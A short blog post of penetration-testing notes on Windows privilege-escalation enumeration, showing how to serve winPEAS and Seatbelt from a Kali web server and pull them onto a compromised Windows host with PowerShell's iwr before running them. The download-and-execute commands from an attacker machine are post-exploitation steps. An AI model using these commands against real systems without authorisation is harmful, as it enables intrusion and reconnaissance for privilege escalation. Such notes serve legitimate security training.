---
layout: post
title: Windows Powershell Enumeration
titledate: 09/15/23
tags: ["infosec","offsec", "privesc", "powershell", "winpeas", "seatbelt"]
---

#### using winpeas to enumerate

first we start a web server hosting winpeas on our kali box

    $ python3 -m http.server 80

next if we have access to the windows system via a user shell

    $ powershell

    PS > iwr -uri http://192.168.10.10/winPEASx64.exe -Outfile winPEAS.exe

    $ .\winPEAS.exe

after we copy the executable over and run it we can gain a host of information about the target win system

similarly Ghostpack has a lot of useful tools like Seatbelt

    $ python3 -m http.server 80

again hosting the binary on our machine (find a way to execute it on the target)

    $ powershell

    PS > iwr -uri http://192.168.10.10/Seatbelt.exe -Outfile Seatbelt.exe
    
    $ .\Seatbelt.exe -group=all